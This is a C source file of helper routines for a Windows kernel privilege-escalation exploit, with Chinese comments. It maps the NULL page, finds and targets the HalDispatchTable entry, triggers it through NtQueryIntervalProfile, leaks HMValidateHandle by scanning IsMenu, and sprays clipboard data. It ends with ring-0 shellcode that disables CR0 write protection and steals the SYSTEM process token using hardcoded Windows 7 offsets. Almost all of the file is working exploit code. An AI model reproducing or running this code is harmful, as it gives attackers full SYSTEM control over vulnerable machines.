#include "base.h"

void ShowError(char *msg, DWORD dwErrorCode)
{
	printf("%s Error 0x%X\n", msg, dwErrorCode);
}

BOOL AllocateZeroMemory()
{
	NTSTATUS status = STATUS_SUCCESS;
	PVOID pZeroAddress = NULL;
	DWORD dwZeroSize = PAGE_SIZE;
	BOOL bRet = TRUE;

	// 获得0地址的内存
	pZeroAddress = (PVOID)sizeof(ULONG);
	status = NtAllocateVirtualMemory(NtCurrentProcess(),
									 &pZeroAddress,
									 0,
									 &dwZeroSize,
									 MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
									 PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(status))
	{
		ShowError("NtAllocateVirtualMemory", status);
		bRet = FALSE;
		goto exit;
	}

	ZeroMemory((PVOID)0, dwZeroSize);
exit:
	return bRet;
}

PVOID GetHalQuerySystemInformation()
{
	NTSTATUS status = STATUS_SUCCESS;
	DWORD dwReturnLength = 0;
	PSYSTEM_MODULE_INFORMATION pModuleInformation = NULL;
	DWORD dwImageBase = 0;
	PVOID pMappedBase = NULL;
	UCHAR szImageName[KERNEL_NAME_LENGTH] = { 0 };
	UNICODE_STRING uDllName;
	PVOID pHalDispatchTable = NULL, pXHalQuerySystemInformation = NULL;
	DWORD dwDllCharacteristics = DONT_RESOLVE_DLL_REFERENCES;


	// 此时dwReturnLength是0，所以函数会由于长度为0执行失败
	// 然后系统会在第四个参数指定的地址保存需要的内存大小
	status = ZwQuerySystemInformation(SystemModuleInformation,
									  pModuleInformation,
									  dwReturnLength,
		                              &dwReturnLength);

	if (status != STATUS_INFO_LENGTH_MISMATCH)
	{
		ShowError("ZwQuerySystemInformation", status);
		goto exit;
	}

	// 按页大小对齐
	dwReturnLength = (dwReturnLength & 0xFFFFF000) + PAGE_SIZE * sizeof(ULONG);
	pModuleInformation = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL,
																  dwReturnLength,
																  MEM_COMMIT | MEM_RESERVE,
																  PAGE_READWRITE);
	if (!pModuleInformation)
	{
		ShowError("VirtualAlloc", GetLastError());
		goto exit;
	}

	status = ZwQuerySystemInformation(SystemModuleInformation,
									  pModuleInformation,
									  dwReturnLength,
									  &dwReturnLength);
	if (!NT_SUCCESS(status))
	{
		ShowError("ZwQuerySystemInformation", status);
		goto exit;
	}

	// 模块加载的基地址
	dwImageBase = (DWORD)(pModuleInformation->Module[0].Base);

	// 获取模块名
	RtlMoveMemory(szImageName,
				  (PVOID)(pModuleInformation->Module[0].ImageName + 
			      pModuleInformation->Module[0].PathLength),
				  KERNEL_NAME_LENGTH);

	// 转换为UNICODE_STRING类型
	RtlCreateUnicodeStringFromAsciiz(&uDllName, (PUCHAR)szImageName);

	status = (NTSTATUS)LdrLoadDll(NULL,
								  &dwDllCharacteristics,
								  &uDllName,
								  &pMappedBase);

	if (!NT_SUCCESS(status))
	{
		ShowError("LdrLoadDll", status);
		goto exit;
	}

	// 获取内核HalDispatchTable函数表地址
	pHalDispatchTable = GetProcAddress((HMODULE)pMappedBase, "HalDispatchTable");

	if (pHalDispatchTable == NULL)
	{
		ShowError("GetProcAddress", GetLastError());
		goto exit;
	}

	pHalDispatchTable = (PVOID)((DWORD)pHalDispatchTable - (DWORD)pMappedBase + dwImageBase);
	pXHalQuerySystemInformation = (PVOID)((DWORD)pHalDispatchTable + sizeof(ULONG));

exit:
	if (pModuleInformation)
	{
		VirtualFree(pModuleInformation,
					dwReturnLength,
					MEM_DECOMMIT | MEM_RELEASE);
	}

	if (pMappedBase)
	{
		LdrUnloadDll(pMappedBase);
	}

	return pXHalQuerySystemInformation;
}

BOOL CallNtQueryIntervalProfile()
{
	BOOL bRet = TRUE;
	NTSTATUS status = STATUS_SUCCESS;
	HMODULE hDll = NULL;

	hDll = LoadLibrary("ntdll.dll");
	if (!hDll)
	{
		bRet = FALSE;
		ShowError("LoadLibrary", GetLastError());
		goto exit;
	}

	lpfnNtQueryIntervalProfile MyNtQueryIntervalProfile = (lpfnNtQueryIntervalProfile)GetProcAddress(hDll, "NtQueryIntervalProfile");

	if (!MyNtQueryIntervalProfile)
	{
		bRet = FALSE;
		ShowError("MyNtQueryIntervalProfile", GetLastError());
		goto exit;
	}

	DWORD dwRet = 0;
	status = MyNtQueryIntervalProfile(ProfileTotalIssues, &dwRet);
	if (!NT_SUCCESS(status))
	{
		ShowError("NtQueryIntervalProfile", status);
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

PVOID GetHMValidateHandle()
{
	PVOID pFuncAddr = NULL;
	HMODULE hUser32 = NULL;
	PBYTE pIsMenu = NULL;
	DWORD i = 0, dwFuncOffset = 0;

	hUser32 = LoadLibraryA("user32.dll");
	if (!hUser32)
	{
		ShowError("LoadLibraryA", GetLastError());
		goto exit;
	}

	pIsMenu = (PBYTE)GetProcAddress(hUser32, "IsMenu");
	if (!pIsMenu)
	{
		ShowError("GetProcAddress", GetLastError());
		goto exit;
	}

	for (i = 0; i < PAGE_SIZE; i++)
	{
		if (pIsMenu[i] == 0xE8)
		{
			dwFuncOffset = *(PDWORD)(pIsMenu + i + 1);
			pFuncAddr = (PVOID)(dwFuncOffset + pIsMenu + i + 5);
			break;
		}
	}

exit:
	return pFuncAddr;
}

BOOL CreateClipboard(DWORD dwSize)
{
	BOOL bRet = TRUE;
	PCHAR pBuffer = NULL;
	HGLOBAL hMem = NULL;

	pBuffer = (PCHAR)malloc(dwSize);
	if (!pBuffer)
	{
		ShowError("malloc", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	ZeroMemory(pBuffer, dwSize);
	FillMemory(pBuffer, dwSize, 0x41);

	hMem = GlobalAlloc(GMEM_MOVEABLE, dwSize);
	if (hMem == NULL)
	{
		ShowError("GlobalAlloc", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	CopyMemory(GlobalLock(hMem), pBuffer, dwSize);

	GlobalUnlock(hMem);

	SetClipboardData(CF_TEXT, hMem);
exit:
	return bRet;
}

NTSTATUS __declspec(naked) ShellCode(ULONG InformationClass, ULONG BufferSize, PVOID Buffer, PULONG ReturnedLength)
{
	__asm
	{
		pushfd
		pushad
	}

	// 关闭页保护
	__asm
	{
		cli
		mov eax, cr0
		and eax, ~0x10000
		mov cr0, eax
	}

	// 开始提权
	__asm
	{
		// 取当前线程
		mov eax, fs:[0x124]
		// 取线程对应的EPROCESS
		mov esi, [eax + 0x150]
		mov eax, esi
		// 查找PID=4的system进程
	searchWin7:
		mov eax, [eax + 0xB8]
		sub eax, 0xB8
		mov edx, [eax + 0xB4]
		cmp edx, 0x4
		jne searchWin7
		// 替换Token,并增加引用计数
		mov eax, [eax + 0xF8]
		and al, 0xF8
		mov [esi + 0xF8], eax
		add [eax - 0x18], 2
	}

	// 开起页保护
	__asm
	{
		mov eax, cr0
		or eax, 0x10000
		mov cr0, eax
		sti
	}

	__asm
	{
		popad
		popfd
	}

	// 设置返回值，退出函数
	__asm
	{
		xor eax, eax
		ret 0x10
	}
}

void ShellCodeEnd(){}